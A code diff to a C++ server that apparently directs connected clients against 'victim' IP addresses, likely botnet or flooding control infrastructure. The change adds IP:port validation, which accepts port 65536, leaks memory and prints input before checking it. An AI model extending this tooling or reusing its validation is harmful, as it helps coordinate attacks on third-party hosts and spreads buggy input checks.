@@ -1,4 +1,5 @@
 #include "server.h"
+#include <boost/range/algorithm.hpp>
 
 server::server(io::io_context& io_context, std::uint16_t port)
     : io_context_(io_context),
@@ -194,9 +195,10 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 
 	std::string victim_ip = params[1];
 
+
 	PRINT("ADDING NEW VICTIM: ", victim_ip);
 
-	if (validate_ip(victim_ip)) {
+	if (is_valid_ip(victim_ip)) {
 		size_t client_id_for_min_victims = -1;
 		std::string client_ip = "";
 
@@ -221,6 +223,7 @@ void server::handleAddVictim(std::string& command, std::vector<std::string>& par
 	} else {
 		PRINT("WRONG VICTIM IP: ", victim_ip);
 	}
+
 }
 
 void server::pingClients() {
@@ -289,11 +292,126 @@ void server::updateMsgCounter_(session* client) {
 
 bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
 
+
+
+bool server::valid_part(char* s)
+{
+	int n = strlen(s);
+
+	// if length of passed string is
+	// more than 3 then it is not valid
+	if (n > 3)
+		return false;
+
+	// check if the string only contains digits
+	// if not then return false
+	for (int i = 0; i < n; i++)
+		if ((s[i] >= '0' && s[i] <= '9') == false)
+			return false;
+	std::string str(s);
+
+	// if the string is "00" or "001" or
+	// "05" etc then it is not valid
+	if (str.find('0') == 0 && n > 1)
+		return false;
+	std::stringstream geek(str);
+	int x;
+	geek >> x;
+
+	// the string is valid if the number
+	// generated is between 0 to 255
+	return (x >= 0 && x <= 255);
+}
+
+/* return 1 if IP string is
+valid, else return 0 */
+int server::is_valid_ip(std::string victim_ip)
+{
+
+	int ctn = 0;
+
+	for (int i = 0; i<victim_ip.size(); i++) {
+		if (victim_ip.at(i) == ':') {
+			ctn += 1;
+		}
+	}
+
+	if (ctn != 1) {
+		return 0;
+	}
+
+	std::vector<std::string> victim_ip_port_split;
+	boost::split(victim_ip_port_split, victim_ip, boost::is_any_of(":"), boost::token_compress_on);
+	std::vector<std::string> ip_tokens;
+	if (victim_ip_port_split.size() < 2) {
+		return 0;
+	}
+	std::cout << victim_ip_port_split[0] << " " << victim_ip_port_split[1] << "\n";
+	// if empty string then return false
+	if (victim_ip.empty())
+		return 0;
+
+	for (char& c : victim_ip_port_split[1]) {
+		if (!std::isdigit(c)) {
+			return 0;
+		}
+	}
+
+	if (stoi(victim_ip_port_split[1]) < 0 || stoi(victim_ip_port_split[1]) > 65536) {
+		return 0;
+	}
+
+	std::string victim_ip_ip = victim_ip_port_split[0];
+
+	int i, num, dots = 0;
+	int len = strlen(victim_ip_ip.c_str());
+	int count = 0;
+
+	// the number dots in the original
+	// string should be 3
+	// for it to be valid
+	for (int i = 0; i < len; i++)
+		if (victim_ip_ip[i] == '.')
+			count++;
+	if (count != 3)
+		return false;
+
+
+	char *dup = strdup(victim_ip_ip.c_str());
+	char *ptr = strtok(dup, ".");
+	if (ptr == NULL)
+		return 0;
+
+	while (ptr) {
+
+		/* after parsing string, it must be valid */
+		if (valid_part(ptr))
+		{
+			/* parse remaining string */
+			ptr = strtok(NULL, ".");
+			if (ptr != NULL)
+				++dots;
+		}
+		else
+			return 0;
+	}
+
+	if (dots != 3)
+		return 0;
+	return 1;
+}
+
+
 bool server::validate_ip(std::string ip_string) {
 	try {
+
+
 		std::vector<std::string> victim_ip_port_split;
 		boost::split(victim_ip_port_split, ip_string, boost::is_any_of(":"), boost::token_compress_on);
 		std::vector<std::string> ip_tokens;
+		std::cout << victim_ip_port_split[0] << " " << victim_ip_port_split[1] << "\n";
+
+
 		boost::split(ip_tokens, victim_ip_port_split[0], boost::is_any_of("."), boost::token_compress_on);
 
 		if (victim_ip_port_split[1].size() == 0 || stoi(victim_ip_port_split[1]) < 0 || stoi(victim_ip_port_split[1]) > 65536) {
